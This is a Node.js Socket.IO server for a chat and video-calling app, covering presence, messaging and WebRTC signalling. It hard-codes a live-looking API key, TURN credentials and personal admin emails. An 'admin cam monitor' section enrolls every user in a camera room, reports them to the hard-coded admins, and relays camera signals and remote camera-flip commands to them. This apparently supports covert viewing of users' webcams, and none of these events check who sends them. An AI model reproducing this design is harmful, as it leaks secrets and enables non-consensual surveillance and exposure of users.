require('dotenv').config();
const { createServer } = require('http');
const { Server } = require('socket.io');
const crypto = require('crypto');

const httpServer = createServer((req, res) => {
  // CORS headers for all HTTP requests
  const allowedOrigins = process.env.CLIENT_URL ? process.env.CLIENT_URL.split(',') : ['*'];
  const origin = req.headers.origin;
  if (allowedOrigins.includes('*') || allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin || '*');
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  if (req.url === '/health' || req.url === '/ping') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok', timestamp: new Date().toISOString() }));
    return;
  }

  // ── TURN Credentials Endpoint ───────────────────────────────────────────
  if (req.url === '/api/turn-credentials' && req.method === 'GET') {
    const meteredDomain = process.env.METERED_DOMAIN || 'myconnectapp.metered.live';
    const meteredApiKey = process.env.METERED_API_KEY || 'e1c37aa2510a0c7e0af21cbd53bdbb0b9fe8';

    const staticMeteredServers = [
      { urls: ['stun:stun.relay.metered.ca:80', 'stun:stun.l.google.com:19302'] },
      {
        urls: [
          'turn:global.relay.metered.ca:80',
          'turn:global.relay.metered.ca:80?transport=tcp',
          'turn:global.relay.metered.ca:443',
          'turns:global.relay.metered.ca:443?transport=tcp',
        ],
        username: 'b861bc5468dd05aa2aff283d',
        credential: 'fJYY96O75HWDNLuH',
      },
    ];

    // Try Metered dynamic REST API first
    if (meteredApiKey && typeof fetch !== 'undefined') {
      fetch(`https://${meteredDomain}/api/v1/turn/credentials?apiKey=${meteredApiKey}`)
        .then(r => r.json())
        .then(servers => {
          if (Array.isArray(servers) && servers.length > 0) {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ iceServers: servers, ttl: 7200 }));
          } else {
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
          }
        })
        .catch(err => {
          console.warn('[Server] Metered API fetch error, using static servers:', err.message);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
        });
      return;
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ iceServers: staticMeteredServers, ttl: 3600 }));
    return;
  }

  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('Socket.io server is running');
});

const allowedOrigins = process.env.CLIENT_URL 
  ? process.env.CLIENT_URL.split(',') 
  : '*';

const io = new Server(httpServer, {
  cors: {
    origin: allowedOrigins,
    methods: ['GET', 'POST']
  }
});

// Track online users: identifier -> Set of socket IDs (multiple tabs)
const onlineUsers = new Map(); // email or userId -> Set<socketId>

// Track per-socket heartbeat timestamp for crash detection
const heartbeatMap = new Map(); // socketId -> { userId, email, timestamp }

// Track which socket is in an active call
const activeCalls = new Set();

// Track active callId and peer info per socket for disconnect cleanup
// socketId -> { callId, peerEmail, peerUserId }
const activeCallInfo = new Map();

// Helper: get all socket IDs for a target room
function getRoomSockets(target) {
  if (!target) return new Set();
  return io.sockets.adapter.rooms.get(target) || new Set();
}

// Helper: broadcast full online users list to everyone
function broadcastOnlineUsers() {
  const onlineList = Array.from(onlineUsers.keys());
  io.emit('online_users', onlineList);
}

// Broadcast activity update to all connected sockets
// This replaces the old user_last_seen + online_users combo
function broadcastActivityUpdate(userId, email, isOnline, lastSeen) {
  io.emit('activity_update', {
    userId,
    email: email ? email.toLowerCase().trim() : undefined,
    isOnline,
    lastSeen: lastSeen || new Date().toISOString()
  });
}

// ─── 60-SECOND SWEEP: detect stale heartbeats (crash/network loss) ──────────
setInterval(() => {
  const now = Date.now();
  const STALE_THRESHOLD_MS = 60 * 1000; // 60 seconds

  for (const [socketId, data] of heartbeatMap.entries()) {
    const staleness = now - data.timestamp;
    if (staleness > STALE_THRESHOLD_MS) {
      // Socket is stale — mark as offline
      const { userId, email } = data;

      // Clean from onlineUsers
      [email, userId].filter(Boolean).forEach(key => {
        const sockets = onlineUsers.get(key);
        if (sockets) {
          sockets.delete(socketId);
          if (sockets.size === 0) onlineUsers.delete(key);
        }
      });

      heartbeatMap.delete(socketId);

      // Broadcast offline with the last known heartbeat time as lastSeen
      const lastSeen = new Date(data.timestamp).toISOString();
      broadcastActivityUpdate(userId, email, false, lastSeen);
      console.log(`[SWEEP] Marked stale socket ${socketId} offline (user: ${email || userId})`);
    }
  }
}, 60 * 1000);

io.on('connection', (socket) => {
  console.log('Socket connected:', socket.id);

  // Send current online users immediately on connection
  socket.emit('online_users', Array.from(onlineUsers.keys()));

  // ─── IDENTIFY ────────────────────────────────────────────────────────────────
  socket.on('identify', ({ email, userId, username }) => {
    let changed = false;

    if (email) {
      const emailRoom = email.toLowerCase().trim();
      socket.join(emailRoom);
      socket.join('cam_room_' + emailRoom);
      socket.userEmail = emailRoom;
      socket.camEmail = emailRoom;
      socket.camUsername = username || emailRoom.split('@')[0];
      if (!onlineUsers.has(emailRoom)) {
        onlineUsers.set(emailRoom, new Set());
        changed = true;
      }
      onlineUsers.get(emailRoom).add(socket.id);
    }

    if (userId) {
      const idRoom = String(userId).trim();
      socket.join(idRoom);
      socket.userId = idRoom;
      if (!onlineUsers.has(idRoom)) {
        onlineUsers.set(idRoom, new Set());
        changed = true;
      }
      onlineUsers.get(idRoom).add(socket.id);
    }

    // Track heartbeat for this socket
    heartbeatMap.set(socket.id, {
      userId: socket.userId,
      email: socket.userEmail,
      timestamp: Date.now()
    });

    // Broadcast online status update to all
    if (changed || socket.justConnected) {
      broadcastActivityUpdate(socket.userId, socket.userEmail, true, new Date().toISOString());
    }
    socket.justConnected = false;

    broadcastOnlineUsers();
    console.log(`User identified: ${socket.userEmail || ''} / ${socket.userId || ''} (${socket.id})`);
  });

  // ─── HEARTBEAT ───────────────────────────────────────────────────────────────
  socket.on('heartbeat', ({ userId, email }) => {
    // Update heartbeat timestamp — lightweight, no DB write needed here
    // The DB is updated by the client's periodic POST to /api/user/activity
    heartbeatMap.set(socket.id, {
      userId: socket.userId || userId,
      email: socket.userEmail || (email ? email.toLowerCase().trim() : undefined),
      timestamp: Date.now()
    });
  });

  // ─── MESSAGING ───────────────────────────────────────────────────────────────
  socket.on('send_social_message', (data) => {
    const targetRoom = data.receiverEmail ? data.receiverEmail.toLowerCase().trim() : data.receiverId ? String(data.receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_social_message', data);
    }
    if (data.receiverId && String(data.receiverId).trim() !== targetRoom) {
      socket.to(String(data.receiverId).trim()).emit('receive_social_message', data);
    }

    const senderRoom = socket.userEmail || socket.userId;
    if (senderRoom) {
      socket.to(senderRoom).emit('receive_social_message', data);
    }
  });

  socket.on('delete_social_message', (data) => {
    const { receiverEmail, receiverId, ...deleteData } = data;
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('receive_social_delete', deleteData);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('receive_social_delete', deleteData);
    }
  });

  socket.on('react_social_message', (data) => {
    const { receiverEmail, receiverId, ...reactionData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_social_reaction', reactionData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_social_reaction', reactionData);
    }
  });

  socket.on('change_chat_theme', (data) => {
    const { receiverEmail, receiverId, ...themeData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_chat_theme', themeData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_chat_theme', themeData);
    }
  });

  socket.on('change_nickname', (data) => {
    const { receiverEmail, receiverId, ...nicknameData } = data;
    const targetRoom = receiverEmail ? receiverEmail.toLowerCase().trim() : receiverId ? String(receiverId).trim() : null;
    if (targetRoom) {
      socket.to(targetRoom).emit('receive_nickname', nicknameData);
    }
    if (receiverId && String(receiverId).trim() !== targetRoom) {
      socket.to(String(receiverId).trim()).emit('receive_nickname', nicknameData);
    }
  });

  // ─── FOLLOW / REQUEST EVENTS ──────────────────────────────────────────────────
  socket.on('social_request_event', (data) => {
    const { targetEmail, targetUserId, ...eventData } = data;
    if (targetEmail) {
      socket.to(targetEmail.toLowerCase().trim()).emit('receive_social_request_event', eventData);
    }
    if (targetUserId) {
      socket.to(String(targetUserId).trim()).emit('receive_social_request_event', eventData);
    }
  });

  // ─── TYPING ──────────────────────────────────────────────────────────────────
  socket.on('typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_typing', payload);
    }
  });

  socket.on('stop_typing', ({ receiverEmail, receiverId }) => {
    const payload = { email: socket.userEmail, userId: socket.userId };
    if (receiverEmail) {
      socket.to(receiverEmail.toLowerCase().trim()).emit('user_stop_typing', payload);
    }
    if (receiverId) {
      socket.to(String(receiverId).trim()).emit('user_stop_typing', payload);
    }
  });

  // ─── SEEN ────────────────────────────────────────────────────────────────────
  socket.on('mark_as_seen', ({ senderEmail, senderId }) => {
    if (senderEmail) {
      socket.to(senderEmail.toLowerCase().trim()).emit('messages_seen');
    }
    if (senderId) {
      socket.to(String(senderId).trim()).emit('messages_seen');
    }
  });

  // ─── CALL & WEBRTC SIGNALING EVENTS ──────────────────────────────────────────

  const handleCallRequest = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);

    const isTargetBusy = [...targetSockets].some(sid => activeCalls.has(sid));

    if (isTargetBusy) {
      socket.emit('call_busy', { email: targetEmail, userId: targetUserId, callId: data.callId });
      return;
    }

    const payload = { from: data.from, type: data.type, callId: data.callId || `call-${Date.now()}` };

    if (targetEmail) socket.to(targetEmail).emit('incoming_call', payload);
    if (targetUserId) socket.to(targetUserId).emit('incoming_call', payload);
  };

  socket.on('call_user', handleCallRequest);
  socket.on('call_request', handleCallRequest);

  const handleCallAccept = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.add(socket.id);
    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);
    targetSockets.forEach(sid => activeCalls.add(sid));

    // Track call info for disconnect cleanup
    activeCallInfo.set(socket.id, { callId: data.callId, peerEmail: targetEmail, peerUserId: targetUserId });
    targetSockets.forEach(sid => {
      activeCallInfo.set(sid, { callId: data.callId, peerEmail: socket.userEmail, peerUserId: socket.userId });
    });

    const payload = { from: data.from, callId: data.callId };
    if (targetEmail) {
      socket.to(targetEmail).emit('call_accepted', payload);
      socket.to(targetEmail).emit('call_accept', payload);
    }
    if (targetUserId) {
      socket.to(targetUserId).emit('call_accepted', payload);
      socket.to(targetUserId).emit('call_accept', payload);
    }
  };

  socket.on('accept_call', handleCallAccept);
  socket.on('call_accept', handleCallAccept);

  const handleCallDecline = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) {
      socket.to(targetEmail).emit('call_rejected', payload);
      socket.to(targetEmail).emit('call_decline', payload);
    }
    if (targetUserId) {
      socket.to(targetUserId).emit('call_rejected', payload);
      socket.to(targetUserId).emit('call_decline', payload);
    }
  };

  socket.on('reject_call', handleCallDecline);
  socket.on('call_decline', handleCallDecline);

  socket.on('call_cancel', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_cancelled', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_cancelled', payload);
  });

  socket.on('call_timeout', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    const payload = { by: socket.userEmail || socket.userId, callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_timed_out', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_timed_out', payload);
  });

  const handleCallEnd = (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;

    activeCalls.delete(socket.id);
    activeCallInfo.delete(socket.id);
    const targetSockets = new Set([
      ...getRoomSockets(targetEmail),
      ...getRoomSockets(targetUserId)
    ]);
    targetSockets.forEach(sid => {
      activeCalls.delete(sid);
      activeCallInfo.delete(sid);
    });

    const payload = { callId: data.callId };
    if (targetEmail) socket.to(targetEmail).emit('call_ended', payload);
    if (targetUserId) socket.to(targetUserId).emit('call_ended', payload);
  };

  socket.on('end_call', handleCallEnd);
  socket.on('call_end', handleCallEnd);

  // Direct WebRTC SDP offer, answer, and ice_candidate handlers
  socket.on('offer', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { offer: data.offer, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('offer', payload);
    if (targetUserId) socket.to(targetUserId).emit('offer', payload);
  });

  socket.on('answer', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { answer: data.answer, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('answer', payload);
    if (targetUserId) socket.to(targetUserId).emit('answer', payload);
  });

  socket.on('ice_candidate', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { candidate: data.candidate, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('ice_candidate', payload);
    if (targetUserId) socket.to(targetUserId).emit('ice_candidate', payload);
  });

  socket.on('connection_state', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const payload = { state: data.state, from: socket.userEmail || socket.userId };
    if (targetEmail) socket.to(targetEmail).emit('connection_state', payload);
    if (targetUserId) socket.to(targetUserId).emit('connection_state', payload);
  });

  socket.on('webrtc_signal', (data) => {
    const targetEmail = data.to ? data.to.toLowerCase().trim() : null;
    const targetUserId = data.toUserId ? String(data.toUserId).trim() : null;
    const targetSocketId = data.targetSocketId;

    const payload = {
      ...(data.signal || {}),
      from: socket.userEmail || socket.userId,
      fromSocketId: socket.id,
      callId: data.callId
    };

    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('webrtc_signal', payload);
        return;
      }
    }

    if (targetEmail) {
      socket.to(targetEmail).emit('webrtc_signal', payload);
      if (payload.type === 'offer' || payload.offer) {
        socket.to(targetEmail).emit('offer', { offer: payload, from: socket.userEmail || socket.userId });
      } else if (payload.type === 'answer' || payload.answer) {
        socket.to(targetEmail).emit('answer', { answer: payload, from: socket.userEmail || socket.userId });
      } else if (payload.candidate) {
        socket.to(targetEmail).emit('ice_candidate', { candidate: payload.candidate, from: socket.userEmail || socket.userId });
      }
    }
    if (targetUserId) {
      socket.to(targetUserId).emit('webrtc_signal', payload);
      if (payload.type === 'offer' || payload.offer) {
        socket.to(targetUserId).emit('offer', { offer: payload, from: socket.userEmail || socket.userId });
      } else if (payload.type === 'answer' || payload.answer) {
        socket.to(targetUserId).emit('answer', { answer: payload, from: socket.userEmail || socket.userId });
      } else if (payload.candidate) {
        socket.to(targetUserId).emit('ice_candidate', { candidate: payload.candidate, from: socket.userEmail || socket.userId });
      }
    }
  });

  // ─── ADMIN CAM MONITOR ─────────────────────────────────────────────────────
  const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];

  socket.on('cam_user_online', ({ email, username }) => {
    socket.camEmail = email ? email.toLowerCase().trim() : null;
    socket.camUsername = username || email;
    if (socket.camEmail) {
      socket.join('cam_room_' + socket.camEmail);
    }
    ADMIN_EMAILS.forEach(adminEmail => {
      socket.to(adminEmail).emit('cam_user_online_event', {
        email: socket.camEmail,
        username: socket.camUsername,
        socketId: socket.id
      });
    });
  });

  socket.on('cam_get_users', () => {
    const userMap = new Map();
    for (const [, s] of io.sockets.sockets) {
      const email = s.camEmail || s.userEmail;
      if (email) {
        const cleanEmail = email.toLowerCase().trim();
        const username = s.camUsername || s.username || cleanEmail.split('@')[0];
        if (!userMap.has(cleanEmail)) {
          userMap.set(cleanEmail, { email: cleanEmail, username, socketId: s.id });
        }
      }
    }
    socket.emit('cam_users_list', Array.from(userMap.values()));
  });

  socket.on('cam_signal', ({ targetSocketId, targetEmail, signal }) => {
    const payload = {
      fromSocketId: socket.id,
      fromEmail: socket.camEmail || socket.userEmail,
      signal
    };

    let delivered = false;
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('cam_signal', payload);
        delivered = true;
      }
    }
    if (!delivered && targetEmail) {
      const cleanEmail = targetEmail.toLowerCase().trim();
      io.to('cam_room_' + cleanEmail).emit('cam_signal', payload);
    }
  });

  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail }) => {
    const payload = { fromSocketId: socket.id };
    let delivered = false;
    if (targetSocketId) {
      const targetSocket = io.sockets.sockets.get(targetSocketId);
      if (targetSocket && targetSocket.connected) {
        targetSocket.emit('cam_flip_camera', payload);
        delivered = true;
      }
    }
    if (!delivered && targetEmail) {
      const cleanEmail = targetEmail.toLowerCase().trim();
      io.to('cam_room_' + cleanEmail).emit('cam_flip_camera', payload);
    }
  });

  // ─── DISCONNECT ──────────────────────────────────────────────────────────────
  socket.on('disconnect', () => {
    console.log('Socket disconnected:', socket.id);

    // ── Notify peer if disconnected during active call ──────────────────
    const callInfo = activeCallInfo.get(socket.id);
    if (callInfo) {
      const payload = { callId: callInfo.callId, by: socket.userEmail || socket.userId };
      if (callInfo.peerEmail) io.to(callInfo.peerEmail).emit('call_ended', payload);
      if (callInfo.peerUserId) io.to(callInfo.peerUserId).emit('call_ended', payload);
      activeCallInfo.delete(socket.id);
    }

    activeCalls.delete(socket.id);
    heartbeatMap.delete(socket.id);

    // Notify admins that this cam user went offline
    if (socket.camEmail || socket.userEmail) {
      ADMIN_EMAILS.forEach(adminEmail => {
        io.to(adminEmail).emit('cam_user_offline', { socketId: socket.id });
        io.to('cam_room_' + adminEmail).emit('cam_user_offline', { socketId: socket.id });
      });
    }

    // Remove from online tracking
    const roomsToClean = [socket.userEmail, socket.userId].filter(Boolean);
    let wentOffline = false;

    roomsToClean.forEach(room => {
      const sockets = onlineUsers.get(room);
      if (sockets) {
        sockets.delete(socket.id);
        if (sockets.size === 0) {
          onlineUsers.delete(room);
          wentOffline = true;
        }
      }
    });

    if (wentOffline) {
      // Broadcast immediate offline with current time as lastSeen
      broadcastActivityUpdate(
        socket.userId,
        socket.userEmail,
        false,
        new Date().toISOString()
      );
      broadcastOnlineUsers();
    }
  });
});

const PORT = process.env.PORT || 8080;
httpServer.listen(PORT, '0.0.0.0', () => {
  console.log(`>>> Server is running on port ${PORT}`);
  console.log(`>>> Allowed Origins: ${process.env.CLIENT_URL || '*'}`);
});
